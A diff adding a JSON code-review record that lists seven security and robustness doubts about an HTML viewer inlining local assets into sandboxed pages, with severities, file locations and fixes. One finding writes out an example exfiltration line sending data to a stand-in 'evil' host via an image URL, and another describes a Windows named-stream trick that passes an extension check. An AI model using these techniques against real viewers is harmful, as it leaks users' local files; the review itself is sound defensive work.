@@ -1,0 +1,70 @@
+{
+ "stage": "doubt",
+ "gating": "advisory-must-address",
+ "summary": "Could not turn parsing differentials into a read the server would not allow. Two issues the author did not consider: (1) HIGH design - with https images allowed and scripts running, an untrusted page can exfiltrate any image/font/css in its folder tree by naming it and learn which files exist; contradicts the header comment; the evidence gate is only a chat mention. (2) HIGH concurrency - every asset request triggers an uncached, process-serialized transcript scan with an 8-slot backlog cap; many images starve the queue and return 403 on large sessions. Also output-size blow-up from repeated references (medium) and missing abort/dispose in the effect (medium).",
+ "doubts": [
+  {
+   "severity": "high",
+   "lens": "boundary / exfiltration",
+   "claim_under_doubt": "The change exposes no more than the page's own content and keeps the viewer's file reads bounded.",
+   "disproof_attempt": "The sandbox CSP still allows img-src data: blob: https: and scripts run. The viewer now reads sibling files for the untrusted page; a script reads img.src of an embedded data URI and leaks it via new Image().src='https://evil/?d='+chunk. A page can name any image/font/css in its folder tree by guessing names, and learns which exist (refused images fire onerror). The evidence gate only proves the page was mentioned. The header comment 'only the file's own content is at stake' is no longer true. The broad-folder denylist covers only root, home, tmp, Desktop, Documents, Downloads, Pictures.",
+   "file": "client/src/components/external/SmartViewer/HtmlRenderer.tsx",
+   "line": 33,
+   "suggestion": "Accept in writing and fix comments, or narrow: (a) tighten CSP to img-src data: blob: for pages that received assets; (b) click to load local images for outside pages; (c) restrict to the page's own directory plus an explicit asset-folder convention; (d) add a test and doc line naming the residual risk."
+  },
+  {
+   "severity": "high",
+   "lens": "concurrency / amplification",
+   "claim_under_doubt": "The change exposes no more than the page's own content and keeps the viewer's file reads bounded.",
+   "disproof_attempt": "Every asset request runs a full decideSessionFileAccess on the owner page, i.e. an uncached scan of up to 48 MB JSONL, serialized process-wide with MAX_PENDING_SCANS=8 and a 20 s timeout. A page with 40 images + 20 imports causes up to 60 serialized scans; the backlog overflows, findSessionEvidence returns incomplete and assets answer 403 path_not_evidenced on large sessions. Client aborts after 5 s while the server scan keeps its slot. Re-rendering restarts the cycle and starves other evidence users.",
+   "file": "server/src/external/session-file/routes.ts",
+   "line": 71,
+   "suggestion": "Prove the owner page once per burst: a short-TTL memo keyed by (task, owner, transcript size+mtime) in decideAssetAccess, or a batched endpoint. Add a test with a slow evidence stub and 40 assets."
+  },
+  {
+   "severity": "medium",
+   "lens": "resource blow-up",
+   "claim_under_doubt": "The change exposes no more than the page's own content and keeps the viewer's file reads bounded.",
+   "disproof_attempt": "Distinct files (40) and fetched bytes (20 MB) are capped, but the output is not: the data URI is substituted at every occurrence. 2000 img tags referencing one 5 MB file yield about 13 GB of srcdoc. Bytes are counted before base64 expansion and CSS replacements are not counted.",
+   "file": "client/src/components/external/SmartViewer/htmlInlineAssets.ts",
+   "line": 76,
+   "suggestion": "Cap total inlined output length; emit repeated references once or cap replacement count; count the encoded size; stop rewriting at a budget such as 30 MB."
+  },
+  {
+   "severity": "medium",
+   "lens": "async / state",
+   "claim_under_doubt": "The change exposes no more than the page's own content and keeps the viewer's file reads bounded.",
+   "disproof_attempt": "Effect cleanup only sets cancelled. In-flight fetches, queued acquire() waiters and the loader are never aborted; StrictMode or text changes rerun the whole 40-asset fetch while the old one completes. The loader is rebuilt per run, so no cache across text changes.",
+   "file": "client/src/components/external/SmartViewer/HtmlRenderer.tsx",
+   "line": 72,
+   "suggestion": "Give createResourceLoader an AbortSignal/dispose() called by the cleanup so waiters resolve null and fetches abort; optionally cache by (scope, path) across text updates."
+  },
+  {
+   "severity": "low",
+   "lens": "parser differential",
+   "claim_under_doubt": "The change exposes no more than the page's own content and keeps the viewer's file reads bounded.",
+   "disproof_attempt": "Could not turn tokenizer/CSS regex differentials into an unauthorised read; server-side containment is the authority and receives literal paths. Entities, CSS escapes and backslash traversal reach the server as literal names (missing or rejected). Wrong/missing content only: entity in a path, base href ignored, xmp/noembed/plaintext/noscript/template/iframe srcdoc not masked, url() inside CSS comments consume the budget.",
+   "file": "client/src/components/external/SmartViewer/htmlMarkupScan.ts",
+   "line": 139,
+   "suggestion": "Optional: decode entities in attribute values; skip url() inside CSS comments; document that base href is ignored."
+  },
+  {
+   "severity": "low",
+   "lens": "Windows path edge",
+   "claim_under_doubt": "The change exposes no more than the page's own content and keeps the viewer's file reads bounded.",
+   "disproof_attempt": "Extension check uses path.extname on the raw spelling; named stream on a real file such as notes.txt:evil.png has extname .png, passes the lexical check and has no dot segment. Impact low (attacker must plant the stream).",
+   "file": "server/src/core/session-file/asset-access.ts",
+   "line": 69,
+   "suggestion": "Reject any ':' after the drive letter on win32 for asset requests; add a test."
+  },
+  {
+   "severity": "low",
+   "lens": "hidden coupling",
+   "claim_under_doubt": "The change exposes no more than the page's own content and keeps the viewer's file reads bounded.",
+   "disproof_attempt": "claimImport is page-wide first-come-first-served: a stylesheet imported from two places is inlined once, the second @import stays and is blocked by CSP. claimImport is consumed before the fetch, so a failed or timed-out text() burns one of the 20 slots.",
+   "file": "client/src/components/external/SmartViewer/htmlInlineAssets.ts",
+   "line": 69,
+   "suggestion": "Release the claim when text() returns null; document the diamond case."
+  }
+ ]
+}
